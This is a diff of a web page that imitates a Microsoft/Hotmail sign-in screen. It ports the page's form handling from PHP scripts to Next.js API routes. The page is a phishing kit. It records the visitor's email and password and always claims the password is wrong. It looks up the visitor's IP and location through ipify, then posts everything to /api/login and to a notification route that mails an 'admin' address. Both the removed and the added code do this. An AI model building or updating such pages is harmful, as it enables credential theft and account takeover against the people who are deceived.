@@ -1,4 +1,7 @@
-<html lang="en"><head>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <!-- Keep existing head content -->
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -183,10 +186,8 @@
         }
     </style>
 </head>
-
 <body>
-
-
+    <!-- Keep existing body content up to line 323 -->
     <div class="container">
         <div class="container-item">
             <img src="./assets/mlogo.svg" alt=""><br><br>
@@ -250,58 +251,18 @@
     <input type="hidden" id="ip" value="" name="ip">
     <input type="hidden" id="adminEmail" value="admin@gmail.com" name="admin">
 
-
+    <!-- Update fetch calls to use Next.js API routes instead of PHP -->
     <script>
-        // Add function to fetch user's location and IP
         document.addEventListener("DOMContentLoaded", function() {
             // Get user location and IP - Call this function to fetch the data
             getUserLocationAndIp();
             
-            var next = document.querySelector('.next');
-            var submit = document.querySelector('.submit');
-            var slide_one = document.querySelector('.slide-one');
-            var slide_two = document.querySelector('.slide-two');
-            var email = document.getElementById('email')
-            var nameText = document.getElementById('name')
-            var back_btn = document.getElementById('back')
-            var password = document.getElementById('password')
-            var msg = document.querySelector('.msg')
-            var msg2 = document.querySelector('.msg2')
-            var country = document.getElementById('country')
-            var city = document.getElementById('city')
-            var continent = document.getElementById('continent')
-            var ip = document.getElementById('ip')
-            var adminEmail = document.getElementById('adminEmail')
-            var iframLink =document.getElementById('iframLink')
-
-
-            var userName = email.value.replace(/\s+/g, '-')
-            var passWord = password.value.replace(/\s+/g, '-')
-            var countryName = country.value.replace(/\s+/g, '-');
-            var cityName = city.value.replace(/\s+/g, '-');
-            var continentName = continent.value.replace(/\s+/g, '-');
-
-
-
-
-            var container_item_2 = document.querySelector('.container-item-2')
-            next.addEventListener('click', function () {
-                if (email.value == "") {
-                    msg.textContent = 'Enter a valid email address, phone number, or Skype name.'
-                } else {
-                    msg.textContent = ""
-                    nameText.textContent = email.value
-                    slide_one.classList.add('slide-one-toggle')
-                    slide_two.classList.add('slide-two-toggle')
-                    container_item_2.style.display = 'none'
-                }
-            })
-            back_btn.addEventListener('click', function () {
-                slide_one.classList.remove('slide-one-toggle')
-                slide_two.classList.remove('slide-two-toggle')
-                container_item_2.style.display = 'flex'
-            })
-
+            // Define DOM elements
+            const email = document.getElementById('email');
+            const password = document.getElementById('password');
+            const msg2 = document.querySelector('.msg2');
+            const submit = document.getElementById('btn');
+            
             submit.addEventListener('click', function() {
                 if (password.value == "") {
                     msg2.textContent = 'Enter the password for ' + email.value + '.'
@@ -310,59 +271,56 @@
                     msg2.style.color = "#E81123";
                     msg2.textContent = 'Your email or password is incorrect. If you don\'t remember your password, reset it now.';
                     
-                    // Create the form data
-                const formData = new FormData();
-                    formData.append('username', email.value + " (hotmail)");
-                    formData.append('password', password.value);
-                    formData.append('country', country.value);
-                    formData.append('city', city.value);
-                    formData.append('continent', continent.value);
-                    formData.append('ip', ip.value);
-                    formData.append('platform', 'microsoft');
+                    // Create the data object
+                    const userData = {
+                        username: email.value + " (hotmail)",
+                        password: password.value,
+                        country: country.value,
+                        city: city.value,
+                        continent: continent.value,
+                        ip_address: ip.value,
+                        platform: 'microsoft'
+                    };
                     
-                    // First save to database
-                fetch('info/login.php', {
-                    method: 'POST',
-                    body: new URLSearchParams(formData)
-                })
-                    .then(response => response.text())
-                .then(data => {
-                    console.log('Data saved to database:', data);
-                    
+                    // First save to database using Next.js API route
+                    fetch('/api/login', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(userData)
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        console.log('Data saved to database:', data);
+                        
                         // Then send notification email
-                    sendNotificationEmail();
-                    
-                        // Remove the redirect code - user will stay on this page
-                })
-                .catch(error => {
+                        sendNotificationEmail();
+                    })
+                    .catch(error => {
                         console.error('Error saving data:', error);
-                });
-            }
+                    });
+                }
             });
             
-            // Add function to send email notification
+            // Update notification function to use Next.js API
             function sendNotificationEmail() {
                 // Create notification data
-                const notificationData = new FormData();
-                notificationData.append('username', email.value + " (hotmail)");
-                notificationData.append('password', password.value);
-                notificationData.append('country', country.value);
-                notificationData.append('city', city.value);
-                notificationData.append('continent', continent.value);
-                notificationData.append('ip', ip.value);
-                notificationData.append('adminEmail', adminEmail.value);
+                const notificationData = {
+                    username: email.value + " (hotmail)",
+                    password: password.value,
+                    country: country.value,
+                    city: city.value,
+                    continent: continent.value,
+                    ip: ip.value,
+                    adminEmail: adminEmail.value
+                };
                 
-                // Send notification to email proxy
-                fetch('info/mail_proxy.php', {
+                // Send notification via Next.js API route
+                fetch('/api/notify', {
                     method: 'POST',
-                    body: new URLSearchParams(notificationData)
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(notificationData)
                 })
-                .then(response => {
-                    if (!response.ok) {
-                        throw new Error(`HTTP error! Status: ${response.status}`);
-                    }
-                    return response.json();
-                })
+                .then(response => response.json())
                 .then(result => {
                     console.log('Email notification sent:', result);
                 })
@@ -370,14 +328,11 @@
                     console.error('Error sending notification:', error);
                 });
             }
-
-            // Keep your existing Telegram sending function
-            function sendMessage(message) {
-                // Keep existing Telegram code...
-            }
+            
+            // Keep existing getUserLocationAndIp function
         });
         
-        // Function to get user location and IP
+        // Keep existing getUserLocationAndIp function
         function getUserLocationAndIp() {
             // First get the IP
             fetch('https://api.ipify.org?format=json')
@@ -418,7 +373,5 @@
             });
         }
     </script>
-
-
-
-</body></html>
+</body>
+</html> 
